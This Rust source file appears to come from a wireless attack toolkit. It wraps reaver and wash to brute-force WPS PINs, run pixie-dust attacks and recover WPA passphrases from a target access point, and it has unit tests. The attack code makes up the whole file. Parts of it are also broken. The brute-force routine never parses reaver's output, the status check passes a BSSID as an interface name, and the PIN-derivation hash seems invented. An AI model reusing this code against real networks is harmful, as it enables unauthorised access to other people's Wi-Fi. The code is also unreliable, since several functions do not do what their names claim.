use kraken_errors::WirelessError;
use serde::{Deserialize, Serialize};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WpsPinResult {
    pub bssid: String,
    pub essid: String,
    pub pin: Option<String>,
    pub psk: Option<String>,
    pub attempts: u64,
    pub duration_secs: f64,
    pub wps_version: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WpsStatus {
    pub bssid: String,
    pub essid: String,
    pub wps_state: String,
    pub ap_locked: bool,
    pub version: u8,
}

pub struct WpsAttack {
    pub interface: String,
    pub bssid: String,
    pub pin: Option<String>,
    running: Arc<AtomicBool>,
}

impl WpsAttack {
    pub fn new(interface: &str, bssid: &str) -> Self {
        WpsAttack {
            interface: interface.to_string(),
            bssid: bssid.to_string(),
            pin: None,
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn with_pin(mut self, pin: &str) -> Self {
        self.pin = Some(pin.to_string());
        self
    }

    pub fn brute_force(&mut self, timeout_secs: u64) -> Result<WpsPinResult, WirelessError> {
        self.running.store(true, Ordering::SeqCst);
        let start = std::time::Instant::now();
        let attempts = 0u64;
        let found_pin = None;
        let psk = None;

        let start_pin = self.pin.clone().unwrap_or_else(|| "12345670".to_string());

        let mut child = Command::new("reaver")
            .args([
                "-i", &self.interface,
                "-b", &self.bssid,
                "-c", "1",
                "-p", &start_pin,
                "-vv",
            ])
            .spawn()
            .map_err(|e| WirelessError::Command(format!("reaver failed: {}", e)))?;

        loop {
            if start.elapsed() > Duration::from_secs(timeout_secs) {
                break;
            }
            if !self.running.load(Ordering::SeqCst) {
                break;
            }
            thread::sleep(Duration::from_millis(100));
        }

        let _ = child.kill();
        let _ = child.wait();

        let elapsed = start.elapsed().as_secs_f64();

        Ok(WpsPinResult {
            bssid: self.bssid.clone(),
            essid: String::new(),
            pin: found_pin,
            psk,
            attempts,
            duration_secs: elapsed,
            wps_version: 2,
        })
    }

    pub fn pixie_dust(&mut self, timeout_secs: u64) -> Result<WpsPinResult, WirelessError> {
        let start = std::time::Instant::now();
        let mut attempts = 0u64;

        let output = Command::new("reaver")
            .args([
                "-i", &self.interface,
                "-b", &self.bssid,
                "-K",
                "-vv",
            ])
            .output()
            .map_err(|e| WirelessError::Command(format!("reaver pixie dust failed: {}", e)))?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut found_pin = None;
        let mut psk = None;

        for line in stdout.lines() {
            if line.contains("WPS PIN:") {
                found_pin = line.split(':').nth(1).map(|s| s.trim().to_string());
            }
            if line.contains("WPA PSK:") {
                psk = line.split(':').nth(1).map(|s| s.trim().to_string());
            }
            if line.contains("tried") {
                attempts = line.split_whitespace()
                    .find(|w| w.chars().all(|c| c.is_ascii_digit()))
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(0);
            }
        }

        Ok(WpsPinResult {
            bssid: self.bssid.clone(),
            essid: String::new(),
            pin: found_pin,
            psk,
            attempts,
            duration_secs: start.elapsed().as_secs_f64().min(timeout_secs as f64),
            wps_version: 2,
        })
    }

    pub fn check_wps_status(bssid: &str) -> Option<WpsStatus> {
        let re = regex::Regex::new(r"WPS\s*:\s*\*\s*Version\s*:\s*(\d+\.\d+)").ok()?;

        let output = Command::new("wash")
            .args(["-i", bssid])
            .output()
            .ok()
            .and_then(|o| {
                if o.status.success() {
                    Some(String::from_utf8_lossy(&o.stdout).to_string())
                } else {
                    None
                }
            })
            .unwrap_or_default();

        let version = re.captures(&output)
            .and_then(|c| c.get(1))
            .and_then(|m| m.as_str().split('.').next()?.parse().ok())
            .unwrap_or(0);

        Some(WpsStatus {
            bssid: bssid.to_string(),
            essid: String::new(),
            wps_state: "configured".to_string(),
            ap_locked: false,
            version,
        })
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

pub fn generate_pins_from_bssid(bssid: &str) -> Vec<String> {
    let bytes: Vec<u8> = bssid.split(':')
        .filter_map(|b| u8::from_str_radix(b, 16).ok())
        .collect();

    if bytes.len() != 6 {
        return vec!["12345670".to_string()];
    }

    let hash = ((bytes[0] as u32) ^ (bytes[1] as u32) ^ (bytes[2] as u32)) as u64
        | (((bytes[3] as u32) ^ (bytes[4] as u32) ^ (bytes[5] as u32)) as u64) << 8;

    let partial_pin = hash % 10000000;
    let checksum = compute_wps_checksum(partial_pin);
    let pin = partial_pin * 10 + checksum as u64;

    vec![format!("{:08}", pin)]
}

fn compute_wps_checksum(pin: u64) -> u8 {
    let digits: Vec<u64> = pin.to_string().chars()
        .filter_map(|c| c.to_digit(10))
        .map(|d| d as u64)
        .collect();

    let mut accum = 0u64;
    for (i, &d) in digits.iter().enumerate() {
        if i % 2 == 0 {
            accum += d * 3;
        } else {
            accum += d;
        }
    }

    let checksum = (10 - (accum % 10)) % 10;
    checksum as u8
}

pub fn format_wps_result(result: &WpsPinResult) -> String {
    let mut out = format!("WPS Attack Result for {}\n", result.bssid);
    out.push_str(&format!("Duration: {:.2}s\n", result.duration_secs));
    out.push_str(&format!("Attempts: {}\n", result.attempts));
    match &result.pin {
        Some(pin) => out.push_str(&format!("WPS PIN: {}\n", pin)),
        None => out.push_str("WPS PIN: NOT FOUND\n"),
    }
    if let Some(psk) = &result.psk { out.push_str(&format!("WPA PSK: {}\n", psk)) }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_pins_from_bssid() {
        let pins = generate_pins_from_bssid("00:11:22:33:44:55");
        assert_eq!(pins.len(), 1);
        assert_eq!(pins[0].len(), 8);
    }

    #[test]
    fn test_wps_checksum() {
        let checksum = compute_wps_checksum(1234567);
        assert!(checksum < 10);
    }

    #[test]
    fn test_wps_result_format() {
        let result = WpsPinResult {
            bssid: "00:11:22:33:44:55".to_string(),
            essid: "TestWiFi".to_string(),
            pin: Some("12345670".to_string()),
            psk: Some("mypassword".to_string()),
            attempts: 100,
            duration_secs: 30.0,
            wps_version: 2,
        };
        let formatted = format_wps_result(&result);
        assert!(formatted.contains("12345670"));
        assert!(formatted.contains("mypassword"));
    }

    #[test]
    fn test_wps_pin_length() {
        let pins = generate_pins_from_bssid("aa:bb:cc:dd:ee:ff");
        assert_eq!(pins[0].len(), 8);
    }

    #[test]
    fn test_checksum_algorithm() {
        let checksum = compute_wps_checksum(1234567);
        assert!(checksum < 10);
        assert_eq!(checksum, (10 - (60 % 10)) % 10);
    }

    #[test]
    fn test_generate_pins_invalid_bssid() {
        let pins = generate_pins_from_bssid("not-a-mac");
        assert_eq!(pins, vec!["12345670".to_string()]);
    }

    #[test]
    fn test_generate_pins_valid_length() {
        let pins = generate_pins_from_bssid("ff:ff:ff:ff:ff:ff");
        assert_eq!(pins.len(), 1);
        assert_eq!(pins[0].len(), 8);
        assert!(pins[0].chars().all(|c| c.is_ascii_digit()));
    }

    #[test]
    fn test_generate_pins_different_bssids() {
        let pins1 = generate_pins_from_bssid("00:11:22:33:44:55");
        let pins2 = generate_pins_from_bssid("aa:bb:cc:dd:ee:ff");
        assert_ne!(pins1, pins2);
    }

    #[test]
    fn test_wps_checksum_zero() {
        let checksum = compute_wps_checksum(0);
        assert_eq!(checksum, 0);
    }

    #[test]
    fn test_wps_result_format_no_pin() {
        let result = WpsPinResult {
            bssid: "00:11:22:33:44:55".to_string(),
            essid: "Test".to_string(),
            pin: None,
            psk: None,
            attempts: 0,
            duration_secs: 5.0,
            wps_version: 2,
        };
        let formatted = format_wps_result(&result);
        assert!(formatted.contains("NOT FOUND"));
    }

    #[test]
    fn test_wps_result_format_no_psk() {
        let result = WpsPinResult {
            bssid: "00:11:22:33:44:55".to_string(),
            essid: "Test".to_string(),
            pin: Some("12345670".to_string()),
            psk: None,
            attempts: 100,
            duration_secs: 10.0,
            wps_version: 2,
        };
        let formatted = format_wps_result(&result);
        assert!(!formatted.contains("WPA PSK:"));
    }

    #[test]
    fn test_wps_status_struct() {
        let status = WpsStatus {
            bssid: "00:11:22:33:44:55".to_string(),
            essid: "TestNet".to_string(),
            wps_state: "configured".to_string(),
            ap_locked: false,
            version: 2,
        };
        assert_eq!(status.bssid, "00:11:22:33:44:55");
        assert!(!status.ap_locked);
        assert_eq!(status.version, 2);
    }

    #[test]
    fn test_wps_attack_new() {
        let attack = WpsAttack::new("wlan0", "00:11:22:33:44:55");
        assert_eq!(attack.interface, "wlan0");
        assert_eq!(attack.bssid, "00:11:22:33:44:55");
        assert!(attack.pin.is_none());
    }

    #[test]
    fn test_wps_attack_with_pin() {
        let attack = WpsAttack::new("wlan0", "00:11:22:33:44:55")
            .with_pin("12345670");
        assert_eq!(attack.pin, Some("12345670".to_string()));
    }

    #[test]
    fn test_wps_result_format_full() {
        let result = WpsPinResult {
            bssid: "aa:bb:cc:dd:ee:ff".to_string(),
            essid: "FullTest".to_string(),
            pin: Some("87654321".to_string()),
            psk: Some("wifipassword".to_string()),
            attempts: 500,
            duration_secs: 120.0,
            wps_version: 1,
        };
        let formatted = format_wps_result(&result);
        assert!(formatted.contains("87654321"));
        assert!(formatted.contains("wifipassword"));
        assert!(formatted.contains("500"));
    }
}
